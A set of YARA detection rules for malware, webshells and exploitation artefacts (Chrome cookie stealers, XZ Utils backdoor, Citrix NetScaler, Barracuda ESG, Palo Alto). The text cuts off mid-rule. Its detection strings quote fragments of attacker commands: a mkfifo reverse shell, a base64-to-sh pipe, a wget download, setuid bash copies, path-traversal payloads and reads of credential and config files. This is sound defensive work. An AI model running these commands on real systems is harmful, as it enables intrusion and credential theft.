rule MAL_DLL_Chrome_App_Bound_Encryption_Decryption_May25_RID3AB1 : DEMO EXE FILE G1006 MAL {
   meta:
      description = "Detects a DLL used to decrypt App-Bound Encrypted (ABE) cookies, passwords & payment methods from Chromium-based browsers, seen being used by Kats stealer"
      author = "MalGamy"
      reference = "Internal Research"
      date = "2025-05-19 19:57:21"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, EXE, FILE, G1006, MAL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "Failed to set proxy blanket." ascii
      $s2 = "Decryption failed. Last error:" ascii
      $s3 = "\\Google\\Chrome\\User Data\\Local State" ascii
      $op1 = { 48 39 F3 74 ?? 4C 89 E2 48 89 E9 E8 ?? ?? ?? ?? 48 89 C1 48 8B 00 B2 ?? 48 8B 40 ?? 48 C7 44 01 ?? ?? ?? ?? ?? E8 ?? ?? ?? ?? 0F B6 13 48 89 C1 E8 ?? ?? ?? ?? 48 FF C3 EB ?? 48 8D 54 24 ?? 48 89 F9 E8 ?? ?? ?? ?? 48 89 E9 E8 ?? ?? ?? ?? 48 89 F8 48 81 C4 } 
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 2MB and $op1 and 1 of ( $s* )
}

rule VULN_Erlang_OTP_SSH_CVE_2025_32433_Apr25_RID3359 : CVE_2025_32433 DEMO T1021_004 {
   meta:
      description = "Detects binaries vulnerable to CVE-2025-32433 in Erlang/OTP SSH"
      author = "Pierre-Henri Pezier, Florian Roth"
      reference = "https://www.upwind.io/feed/cve-2025-32433-critical-erlang-otp-ssh-vulnerability-cvss-10"
      date = "2025-04-18 14:44:01"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CVE_2025_32433, DEMO, T1021_004"
      minimum_yara = "3.5.0"
      
   strings:
      $a1 = { 46 4F 52 31 ?? ?? ?? ?? 42 45 41 4D } 
      $s1 = "ssh_connection.erl" 
      $fix1 = "chars_limit" 
      $fix2 = "allow    macro_log" 
      $fix3 = "logger" 
      $fix4 = "max_log_item_len" 
   condition: 
      filesize < 1MB and $a1 at 0 and $s1 and not 1 of ( $fix* )
}

rule MAL_PHISH_Final_Payload_Feb25_RID310B : DEMO MAL T1203 T1566_001 {
   meta:
      description = "Detects possible final payload of phishing-delivered malware, where embedded shellcode is used to decrypt and execute the payload after user-supplied password input."
      author = "X__Junior"
      reference = "https://x.com/dtcert/status/1890384162818802135"
      date = "2025-02-14 13:05:41"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, MAL, T1203, T1566_001"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "%lu: %s %s" wide
      $s2 = "(Direct Inbound)" wide
      $s3 = "(Primary Domain)" wide
      $s4 = "(Forest Tree Root" wide
      $s5 = "(Native Mode)" wide
      $s6 = "(In Forest)" wide
      $s7 = "(None)" wide
   condition: 
      all of them
}

rule MAL_ELF_Xlogin_Nov24_1_RID2E79 : DEMO FILE LINUX MAL {
   meta:
      description = "Detects xlogin backdoor samples"
      author = "Florian Roth"
      reference = "https://blog.sekoia.io/solving-the-7777-botnet-enigma-a-cybersecurity-quest/"
      date = "2024-11-11 11:16:01"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "2b09a6811a9d0447f8c6480430eb0f7e3ff64fa933d0b2e8cd6117f38382cc6a"
      hash2 = "d1cbf80786b1ca1ba2e5c31ec09159be276ad3d10fc0a8a0dbff229d8263ca0a"
      hash3 = "ff17e9bcc1ed16985713405b95745e47674ec98e3c6c889df797600718a35b2c"
      tags = "DEMO, FILE, LINUX, MAL"
      minimum_yara = "3.5.0"
      
   strings:
      $xc1 = { 6C 6F 67 69 6E 3A 00 25 73 00 00 2F 62 69 6E 2F 73 68 00 2F 74 6D 70 2F 6C 6F 67 69 6E } 
      $s1 = "/tmp/login" ascii fullword
      $s2 = "npxXoudifFeEgGaACSnmcs[" ascii fullword
      $sc1 = { 28 6E 69 6C 29 00 00 00 28 6E 75 6C 6C 29 } 
   condition: 
      uint16 ( 0 ) == 0x457f and filesize < 500KB and ( 1 of ( $x* ) or 2 of them )
}

rule MAL_LNX_Perfctl_Oct24_RID2E56 : DEMO FILE LINUX MAL {
   meta:
      description = "Detects Perfctl malware samples"
      author = "Florian Roth"
      reference = "https://www.aquasec.com/blog/perfctl-a-stealthy-malware-targeting-millions-of-linux-servers/"
      date = "2024-10-09 11:10:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "a6d3c6b6359ae660d855f978057aab1115b418ed277bb9047cd488f9c7850747"
      hash2 = "ca3f246d635bfa560f6c839111be554a14735513e90b3e6784bedfe1930bdfd6"
      tags = "DEMO, FILE, LINUX, MAL"
      minimum_yara = "3.5.0"
      
   strings:
      $op1 = { 83 45 f8 01 8b 45 f8 48 3b 45 98 0f 82 1b ff ff ff 90 c9 c3 55 } 
      $op2 = { 48 8b 55 a0 48 01 ca 0f b6 0a 48 8b 55 a8 89 c0 88 4c 02 18 8b 45 fc 83 e0 3f } 
      $op3 = { 88 4c 10 58 83 45 f8 01 83 7d f8 03 0f 86 68 ff ff ff 90 c9 c3 55 } 
      $op4 = { 48 83 ec 68 48 89 7d a8 48 89 75 a0 48 89 55 98 48 8b 45 a8 48 8b 00 83 e0 3f 89 45 fc } 
   condition: 
      uint16 ( 0 ) == 0x457f and filesize < 300KB and 2 of them
}

rule EXPL_PaloAlto_CVE_2024_3400_Apr24_1_RID31C7 : CVE_2024_3400 DEMO EXPLOIT {
   meta:
      description = "Detects characteristics of the exploit code used in attacks against Palo Alto GlobalProtect CVE-2024-3400"
      author = "Florian Roth"
      reference = "https://www.volexity.com/blog/2024/04/12/zero-day-exploitation-of-unauthenticated-remote-code-execution-vulnerability-in-globalprotect-cve-2024-3400/"
      date = "2024-04-15 13:37:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CVE_2024_3400, DEMO, EXPLOIT"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "SESSID=../../../../opt/panlogs/" 
      $x2 = "SESSID=./../../../../opt/panlogs/" 
      $sa1 = "SESSID=../../../../" 
      $sa2 = "SESSID=./../../../../" 
      $sb2 = "${IFS}" 
   condition: 
      1 of ( $x* ) or ( 1 of ( $sa* ) and $sb2 )
}

rule BCKDR_XZUtil_Script_CVE_2024_3094_Mar24_1_RID3402 : CVE_2024_3094 DEMO SCRIPT {
   meta:
      description = "Detects make file and script contents used by the backdoored XZ library (xzutil) CVE-2024-3094."
      author = "Florian Roth"
      reference = "https://www.openwall.com/lists/oss-security/2024/03/29/4"
      date = "2024-03-30 15:12:11"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CVE_2024_3094, DEMO, SCRIPT"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "/bad-3-corrupt_lzma2.xz | tr " ascii
      $x2 = "/tests/files/good-large_compressed.lzma|eval $i|tail -c +31265|" ascii
      $x3 = "eval $zrKcKQ" ascii
   condition: 
      1 of them
}

rule BCKDR_XZUtil_Binary_CVE_2024_3094_Mar24_1_RID33F2 : CVE_2024_3094 DEMO FILE {
   meta:
      description = "Detects injected code used by the backdoored XZ library (xzutil) CVE-2024-3094."
      author = "Florian Roth"
      reference = "https://www.openwall.com/lists/oss-security/2024/03/29/4"
      date = "2024-03-30 15:09:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "319feb5a9cddd81955d915b5632b4a5f8f9080281fb46e2f6d69d53f693c23ae"
      hash2 = "605861f833fc181c7cdcabd5577ddb8989bea332648a8f498b4eef89b8f85ad4"
      hash3 = "8fa641c454c3e0f76de73b7cc3446096b9c8b9d33d406d38b8ac76090b0344fd"
      tags = "CVE_2024_3094, DEMO, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $op1 = { 48 8d 7c 24 08 f3 ab 48 8d 44 24 08 48 89 d1 4c 89 c7 48 89 c2 e8 ?? ?? ?? ?? 89 c2 } 
      $op2 = { 31 c0 49 89 ff b9 16 00 00 00 4d 89 c5 48 8d 7c 24 48 4d 89 ce f3 ab 48 8d 44 24 48 } 
      $op3 = { 4d 8b 6c 24 08 45 8b 3c 24 4c 8b 63 10 89 85 78 f1 ff ff 31 c0 83 bd 78 f1 ff ff 00 f3 ab 79 07 } 
      $xc1 = { F3 0F 1E FA 55 48 89 F5 4C 89 CE 53 89 FB 81 E7 00 00 00 80 48 83 EC 28 48 89 54 24 18 48 89 4C 24 10 } 
   condition: 
      uint16 ( 0 ) == 0x457f and ( all of ( $op* ) or $xc1 )
}

rule BCKDR_XZUtil_KillSwitch_CVE_2024_3094_Mar24_1_RID358B : CVE_2024_3094 DEMO {
   meta:
      description = "Detects kill switch used by the backdoored XZ library (xzutil) CVE-2024-3094."
      author = "Florian Roth"
      reference = "https://gist.github.com/q3k/af3d93b6a1f399de28fe194add452d01?permalink_comment_id=5006558#gistcomment-5006558"
      date = "2024-03-30 16:17:41"
      score = 85
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CVE_2024_3094, DEMO"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "yolAbejyiejuvnup=Evjtgvsh5okmkAvj" 
   condition: 
      $x1
}

rule APT_MAL_FalseFont_Backdoor_Jan24_RID3272 : APT DEMO EXE FILE G0064 MAL T1003 {
   meta:
      description = "Detects FalseFont backdoor, related to Peach Sandstorm APT"
      author = "X__Junior, Jonathan Peters"
      reference = "https://twitter.com/MsftSecIntel/status/1737895710169628824"
      date = "2024-01-11 14:05:31"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "APT, DEMO, EXE, FILE, G0064, MAL, T1003"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "Agent.Core.WPF.App" ascii
      $x2 = "3EzuNZ0RN3h3oV7rzILktSHSaHk+5rtcWOr0mlA1CUA=" wide
      $x3 = "viOIZ9cX59qDDjMHYsz1Yw==" wide
      $sa1 = "StopSendScreen" wide
      $sa2 = "Decryption failed :(" wide
      $sb1 = "{0}     {1}     {2}     {3}" wide
      $sb2 = "\\BraveSoftware\\Brave-Browser\\User Data\\" wide
      $sb3 = "select * from logins" wide
      $sb4 = "Loginvault.db" wide
      $sb5 = "password_value" wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and ( 1 of ( $x* ) or all of ( $sa* ) or all of ( $sb* ) or ( 1 of ( $sa* ) and 4 of ( $sb* ) ) )
}

rule MAL_Backdoor_DLL_Nov23_1_RID2F31 : CVE_2023_4966 DEMO EXE FILE MAL RANSOM {
   meta:
      description = "Detects a backdoor DLL, that was seen being used by LockBit 3.0 affiliates exploiting CVE-2023-4966"
      author = "X__Junior"
      reference = "https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-325a"
      date = "2023-11-23 11:46:41"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "cc21c77e1ee7e916c9c48194fad083b2d4b2023df703e544ffb2d6a0bfc90a63"
      hash2 = "0eb66eebb9b4d671f759fb2e8b239e8a6ab193a732da8583e6e8721a2670a96d"
      tags = "CVE_2023_4966, DEMO, EXE, FILE, MAL, RANSOM"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "ERROR GET INTERVAL" ascii
      $s2 = "OFF HIDDEN MODE" ascii
      $s3 = "commandMod:" ascii
      $s4 = "RESULT:" ascii
      $op1 = { C7 44 24 ?? 01 00 00 00 C7 84 24 ?? ?? ?? ?? FF FF FF FF 83 7C 24 ?? 00 74 ?? 83 BC 24 ?? ?? ?? ?? 00 74 ?? 4C 8D 8C 24 ?? ?? ?? ?? 41 B8 00 04 00 00 48 8D 94 24 ?? ?? ?? ?? 48 8B 4C 24 ?? FF 15 } 
      $op2 = { 48 C7 44 24 ?? 00 00 00 00 C7 44 24 ?? 00 00 00 00 C7 44 24 ?? 03 00 00 00 48 8D 0D ?? ?? ?? ?? 48 89 4C 24 ?? 4C 8D 0D ?? ?? ?? ?? 44 0F B7 05 ?? ?? ?? ?? 48 8B D0 48 8B 4C 24 ?? FF 15 } 
   condition: 
      uint16 ( 0 ) == 0x5a4d and ( all of ( $s* ) or all of ( $op* ) )
}

rule MAL_Trojan_DLL_Nov23_RID2DEA : CVE_2023_4966 DEMO EXE FILE MAL RANSOM {
   meta:
      description = "Detects a trojan DLL that installs other components - was seen being used by LockBit 3.0 affiliates exploiting CVE-2023-4966"
      author = "X__Junior"
      reference = "https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-325a"
      date = "2023-11-23 10:52:11"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "e557e1440e394537cca71ed3d61372106c3c70eb6ef9f07521768f23a0974068"
      tags = "CVE_2023_4966, DEMO, EXE, FILE, MAL, RANSOM"
      minimum_yara = "3.5.0"
      
   strings:
      $op1 = { C7 84 24 ?? ?? ?? ?? 52 70 63 53 C7 84 24 ?? ?? ?? ?? 74 72 69 6E C7 84 24 ?? ?? ?? ?? 67 42 69 6E C7 84 24 ?? ?? ?? ?? 64 69 6E 67 C7 84 24 ?? ?? ?? ?? 43 6F 6D 70 C7 84 24 ?? ?? ?? ?? 6F 73 65 41 C7 84 24 ?? ?? ?? ?? 00 40 01 01 } 
      $op2 = { C7 84 24 ?? ?? ?? ?? 6C 73 61 73 C7 84 24 ?? ?? ?? ?? 73 70 69 72 66 C7 84 24 ?? ?? 00 00 70 63 } 
      $op3 = { C7 84 24 ?? ?? ?? ?? 4E 64 72 43 C7 84 24 ?? ?? ?? ?? 6C 69 65 6E C7 84 24 ?? ?? ?? ?? 74 43 61 6C C7 84 24 ?? ?? ?? ?? 6C 33 00 8D } 
   condition: 
      uint16 ( 0 ) == 0x5a4d and all of them
}

rule MAL_DLL_Stealer_Nov23_RID2E4C : CVE_2023_4966 DEMO EXE FILE MAL RANSOM {
   meta:
      description = "Detects a DLL that steals authentication credentials - was seen being used by LockBit 3.0 affiliates exploiting CVE-2023-4966"
      author = "X__Junior"
      reference = "https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-325a"
      date = "2023-11-23 11:08:31"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "17a27b1759f10d1f6f1f51a11c0efea550e2075c2c394259af4d3f855bbcc994"
      tags = "CVE_2023_4966, DEMO, EXE, FILE, MAL, RANSOM"
      minimum_yara = "3.5.0"
      
   strings:
      $op1 = { C7 45 ?? 4D 69 6E 69 C7 45 ?? 44 75 6D 70 C7 45 ?? 57 72 69 74 C7 45 ?? 65 44 75 6D C7 45 ?? 70 00 27 00 C7 45 ?? 44 00 62 00 C7 45 ?? 67 00 68 00 C7 45 ?? 65 00 6C 00 C7 45 ?? 70 00 2E 00 C7 45 ?? 64 00 6C 00 C7 45 ?? 6C 00 00 00 } 
   condition: 
      uint16 ( 0 ) == 0x5a4d and all of them
}

rule MAL_Python_Backdoor_Script_Nov23_RID331B : CVE_2023_4966 DEMO MAL RANSOM SCRIPT T1059_006 {
   meta:
      description = "Detects a trojan (written in Python) that communicates with c2 - was seen being used by LockBit 3.0 affiliates exploiting CVE-2023-4966"
      author = "X__Junior"
      reference = "https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-325a"
      date = "2023-11-23 14:33:41"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "906602ea3c887af67bcb4531bbbb459d7c24a2efcb866bcb1e3b028a51f12ae6"
      tags = "CVE_2023_4966, DEMO, MAL, RANSOM, SCRIPT, T1059_006"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "port = 443 if \"https\"" ascii
      $s2 = "winrm.Session basic error" ascii
      $s3 = "Windwoscmd.run_cmd(str(cmd))" ascii
   condition: 
      filesize < 50KB and all of them
}

rule MAL_LNX_CamaroDragon_Sheel_Oct23_RID3283 : DEMO G0129 LINUX MAL {
   meta:
      description = "Detects CamaroDragon's tool named sheel"
      author = "Florian Roth"
      reference = "https://research.checkpoint.com/2023/the-dragon-who-sold-his-camaro-analyzing-custom-router-implant/"
      date = "2023-10-06 14:08:21"
      score = 85
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "7985f992dcc6fcce76ee2892700c8538af075bd991625156bf2482dbfebd5a5a"
      tags = "DEMO, G0129, LINUX, MAL"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "-h server_ip -p server_port -i update_index[0-4] [-r]" ascii fullword
      $s1 = "read_ip" ascii fullword
      $s2 = "open fail.%m" ascii fullword
      $s3 = "ri:h:p:" ascii fullword
      $s4 = "update server list success!" ascii fullword
   condition: 
      uint16 ( 0 ) == 0x457f and filesize < 30KB and ( 1 of ( $x* ) or 3 of them ) or 4 of them
}

rule MAL_WAR_Ivanti_EPMM_MobileIron_Mi_War_Aug23_RID365A : CVE_2023_35078 DEMO FILE MAL {
   meta:
      description = "Detects WAR file found in the Ivanti EPMM / MobileIron Core compromises exploiting CVE-2023-35078"
      author = "Florian Roth"
      reference = "https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-213a"
      date = "2023-08-01 16:52:11"
      score = 85
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "6255c75e2e52d779da39367e7a7d4b8d1b3c9c61321361952dcc05819251a127"
      tags = "CVE_2023_35078, DEMO, FILE, MAL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "logsPaths.txt" ascii fullword
      $s2 = "keywords.txtFirefox" ascii
   condition: 
      uint16 ( 0 ) == 0x4b50 and filesize < 20KB and all of them
}

rule LOG_EXPL_Citrix_Netscaler_ADC_Exploitation_Attempt_CVE_2023_3519_Jul23_1_RID4034 : CVE_2023_3519 DEMO EXPLOIT LOG {
   meta:
      description = "This YARA rule detects forensic artifacts that appear following an attempted exploitation of Citrix NetScaler ADC CVE-2023-3519. The rule identifies an attempt to access the vulnerable function using an overly long URL, a potential sign of attempted exploitation. However, it does not confirm whether such an attempt was successful."
      author = "Florian Roth"
      reference = "https://blog.assetnote.io/2023/07/24/citrix-rce-part-2-cve-2023-3519/"
      date = "2023-07-27 23:52:31"
      score = 65
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CVE_2023_3519, DEMO, EXPLOIT, LOG"
      minimum_yara = "3.5.0"
      
   strings:
      $sr1 = /GWTEST FORMS SSO: Parse=0; URLLEN=([2-9][0-9]{2}|[0-9]{4,20}); Event: start=0x/ 
      $s1 = ", type=1; Target: start=0x" 
   condition: 
      all of them
}

rule LOG_EXPL_Ivanti_EPMM_MobileIron_Core_CVE_2023_35078_Jul23_1_RID3A62 : CVE_2023_35078 DEMO EXPLOIT LOG {
   meta:
      description = "Detects the successful exploitation of Ivanti Endpoint Manager Mobile (EPMM) / MobileIron Core CVE-2023-35078"
      author = "Florian Roth"
      reference = "Ivanti Endpoint Manager Mobile (EPMM) CVE-2023-35078 - Analysis Guidance"
      date = "2023-07-25 19:44:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CVE_2023_35078, DEMO, EXPLOIT, LOG"
      minimum_yara = "3.5.0"
      
   strings:
      $xr1 = /\/mifs\/aad\/api\/v2\/[^\n]{1,300} 200 [1-9][0-9]{0,60} / 
   condition: 
      $xr1
}

rule EXPL_Citrix_Netscaler_ADC_ForensicArtifacts_CVE_2023_3519_Jul23_3_RID3D91 : CVE_2023_3519 DEMO EXPLOIT {
   meta:
      description = "Detects forensic artifacts found after an exploitation of Citrix NetScaler ADC CVE-2023-3519"
      author = "Florian Roth"
      reference = "https://www.mandiant.com/resources/blog/citrix-zero-day-espionage"
      date = "2023-07-24 22:00:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CVE_2023_3519, DEMO, EXPLOIT"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "cat /flash/nsconfig/ns.conf >>" ascii
      $x2 = "cat /nsconfig/.F1.key >>" ascii
      $x3 = "openssl base64 -d < /tmp/" ascii
      $x4 = "cp /usr/bin/bash /var/tmp/bash" ascii
      $x5 = "chmod 4775 /var/tmp/bash" 
      $x6 = "pwd;pwd;pwd;pwd;pwd;" 
      $x7 = "(&(servicePrincipalName=*)(UserAccountControl:1.2.840.113556.1.4.803:=512)(!(UserAccountControl:1.2.840.113556.1.4.803:=2))(!(objectCategory=computer)))" 
   condition: 
      filesize < 10MB and 1 of them
}

rule WEBSHELL_SECRETSAUCE_Jul23_1_RID2F7C : CVE_2023_3519 DEMO T1505_003 WEBSHELL {
   meta:
      description = "Detects SECRETSAUCE PHP webshells (found after an exploitation of Citrix NetScaler ADC CVE-2023-3519)"
      author = "Florian Roth"
      reference = "https://www.mandiant.com/resources/blog/citrix-zero-day-espionage"
      date = "2023-07-24 11:59:11"
      score = 85
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CVE_2023_3519, DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $sa1 = "for ($x=0; $x<=1; $x++) {" ascii
      $sa2 = "$_REQUEST[" ascii
      $sa3 = "@eval" ascii
      $sb1 = "public $cmd;" ascii
      $sb2 = "return @eval($a);" ascii
      $sb3 = "$z->run($z->get('openssl_public_decrypt'));" 
   condition: 
      filesize < 100KB and ( all of ( $sa* ) or 2 of ( $sb* ) )
}

rule EXPL_Citrix_Netscaler_ADC_ForensicArtifacts_CVE_2023_3519_Jul23_2_RID3D90 : CVE_2023_3519 DEMO EXPLOIT {
   meta:
      description = "Detects forensic artifacts found after an exploitation of Citrix NetScaler ADC CVE-2023-3519"
      author = "Florian Roth"
      reference = "https://www.cisa.gov/sites/default/files/2023-07/aa23-201a_csa_threat_actors_exploiting_citrix-cve-2023-3519_to_implant_webshells.pdf"
      date = "2023-07-21 21:59:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CVE_2023_3519, DEMO, EXPLOIT"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "tar -czvf - /var/tmp/all.txt" ascii fullword
      $s2 = "-out /var/tmp/test.tar.gz" ascii
      $s3 = "/test.tar.gz /netscaler/" 
   condition: 
      filesize < 10MB and 1 of them
}

rule MAL_Compromised_Cert_DuckTail_Stealer_Jun23_RID3749 : DEMO EXE FILE MAL {
   meta:
      description = "Detects binaries signed with certificates used by DuckTail stealer"
      author = "dr4k0nia"
      reference = "Internal Research"
      date = "2023-06-16 17:32:01"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      modified = "2023-08-15"
      hash1 = "17c75f2d14af9f00822fc1dba00ccc9ec71fc50962e196d7e6f193f4b2ee0183"
      hash2 = "b3cfdb442772d07a7f037b0bb093ba315dfd1e79b0e292736c52097355495270"
      hash3 = "9afe013cae0167993a6a7ccd650eb1221a5ec163110565eb3a49a8b57949d4ee"
      tags = "DEMO, EXE, FILE, MAL"
      minimum_yara = "3.5.0"
      
   strings:
      $sx1 = "AZM MARKETING COMPANY LIMITED" ascii fullword
      $sx2 = "CONG TY TNHH" ascii
      $sx3 = { 43 C3 94 4E 47 20 54 59 20 54 4E 48 48 20 } 
      $sx4 = "CONG TY TRACH" ascii
      $se1 = { 65 78 BE 85 2D 48 E3 3D 4E 48 B8 D4 73 F5 B7 60 } 
      $se2 = { 1D 53 38 32 74 2B 58 37 87 C0 A2 53 32 F7 FB 06 } 
      $se3 = { 00 BD 7B 85 B2 6A 69 C9 7D 6D 68 CC 95 67 34 C0 6B } 
      $se4 = { 06 5F 5C 57 0B D6 A7 98 92 FB B0 E6 34 61 3A 4D } 
      $se5 = { 41 55 3F 07 13 37 11 7A 99 B4 58 57 } 
      $se6 = { 1E AA E4 CE E7 EE 89 FB 20 32 59 27 88 13 D8 53 } 
      $se7 = { 56 DC DB 85 D4 89 F9 87 B2 D6 76 72 } 
      $se8 = { 2D A4 50 57 C2 74 3C 1A 3C A4 93 7A } 
      $se9 = { 37 AE 95 F5 4C 8E 9B D0 B6 47 68 6A } 
      $se10 = { 3D C8 F5 3B 62 7A 34 07 AC 7E 01 00 13 87 A3 B3 } 
      $se11 = { 01 C9 87 5A 5F A8 59 68 6D 34 17 C9 } 
      $se12 = { 1B 35 19 E1 CD C2 6B 57 DA EE 06 C9 } 
      $se13 = { 79 7D 0B 5E 22 AA 0F C7 A2 97 E6 48 } 
      $se14 = { 57 9E 5C 89 B0 85 A7 96 B3 3C F3 19 } 
   condition: 
      uint16 ( 0 ) == 0x5a4d and 1 of ( $sx* ) and 1 of ( $se* )
}

rule APT_MAL_UNC4841_SEASPY_Jun23_1_RID2FFA : APT CVE_2023_2868 DEMO MAL {
   meta:
      description = "Detects SEASPY malware used by UNC4841 in attacks against Barracuda ESG appliances exploiting CVE-2023-2868"
      author = "Florian Roth"
      reference = "https://blog.talosintelligence.com/alchimist-offensive-framework/"
      date = "2023-06-16 12:20:11"
      score = 85
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "3f26a13f023ad0dcd7f2aa4e7771bba74910ee227b4b36ff72edc5f07336f115"
      tags = "APT, CVE_2023_2868, DEMO, MAL"
      minimum_yara = "3.5.0"
      
   strings:
      $sx1 = "usage: ./BarracudaMailService <Network-Interface>. e.g.: ./BarracudaMailService eth0" ascii fullword
      $s1 = "fcntl.tmp.amd64." ascii
      $s2 = "Child process id:%d" ascii fullword
      $s3 = "[*]Success!" ascii fullword
      $s4 = "NO port code" ascii
      $s5 = "enter open tty shell" ascii
      $op1 = { 48 89 c6 f3 a6 0f 84 f7 01 00 00 bf 6c 84 5f 00 b9 05 00 00 00 48 89 c6 f3 a6 0f 84 6a 01 00 00 } 
      $op2 = { f3 a6 0f 84 d2 00 00 00 48 89 de bf 51 5e 61 00 b9 05 00 00 00 f3 a6 74 21 48 89 de } 
      $op3 = { 72 de 45 89 f4 e9 b8 f4 ff ff 48 8b 73 08 45 85 e4 ba 49 3d 62 00 b8 44 81 62 00 48 0f 45 d0 } 
   condition: 
      uint16 ( 0 ) == 0x457f and filesize < 9000KB and 3 of them or 5 of them
}

rule APT_UNC4841_ESG_Barracuda_CVE_2023_2868_Forensic_Artifacts_Jun23_1_RID3CE1 : APT CVE_2023_2868 DEMO SCRIPT T1105 {
   meta:
      description = "Detects forensic artifacts found in the exploitation of CVE-2023-2868 in Barracuda ESG devices by UNC4841"
      author = "Florian Roth"
      reference = "https://www.mandiant.com/resources/blog/barracuda-esg-exploited-globally"
      date = "2023-06-15 21:30:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      modified = "2023-06-16"
      tags = "APT, CVE_2023_2868, DEMO, SCRIPT, T1105"
      minimum_yara = "3.5.0"
      
   strings:
      $x01 = "=;ee=ba;G=s;_ech_o $abcdefg_${ee}se64" ascii
      $x02 = ";echo $abcdefg | base64 -d | sh" ascii
      $x03 = "setsid sh -c \"mkfifo /tmp/p" ascii
      $x04 = "sh -i </tmp/p 2>&1" ascii
      $x05 = "if string.match(hdr:body(), \"^[%w%+/=" ascii
      $x06 = "setsid sh -c \"/sbin/BarracudaMailService eth0\"" 
      $x07 = "echo \"set the bvp ok\"" 
      $x08 = "find ${path} -type f ! -name $excludeFileNameKeyword | while read line ;" 
      $x09 = " /mail/mstore | xargs -i cp {} /usr/share/.uc/" 
      $x10 = "tar -T /mail/mstore/tmplist -czvf " 
      $sa1 = "sh -c wget --no-check-certificate http" 
      $sa2 = ".tar;chmod +x " 
   condition: 
      1 of ( $x* ) or all of ( $sa* )
}

rule LOG_EXPL_MOVEit_Exploitation_Indicator_Jun23_3_RID37DC : DEMO EXPLOIT LOG {
   meta:
      description = "Detects a potential compromise indicator found in MOVEit DMZ Web API logs"
      author = "Nasreddine Bencherchali"
      reference = "https://attackerkb.com/topics/mXmV0YpC3W/cve-2023-34362/rapid7-analysis"
      date = "2023-06-13 17:56:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, EXPLOIT, LOG"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "TargetInvocationException" ascii
      $s2 = "MOVEit.DMZ.Application.Folders.ResumableUploadFilePartHandler.DeserializeFileUploadStream" ascii
   condition: 
      all of ( $s* )
}

rule HKTL_EXPL_POC_LibSSH_Auth_Bypass_CVE_2023_2283_Jun23_1_RID3855 : CVE_2023_2283 DEMO EXPLOIT FILE HKTL {
   meta:
      description = "Detects POC code used in attacks against libssh vulnerability CVE-2023-2283"
      author = "Florian Roth"
      reference = "https://github.com/github/securitylab/tree/1786eaae7f90d87ce633c46bbaa0691d2f9bf449/SecurityExploits/libssh/pubkey-auth-bypass-CVE-2023-2283"
      date = "2023-06-08 18:16:41"
      score = 85
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
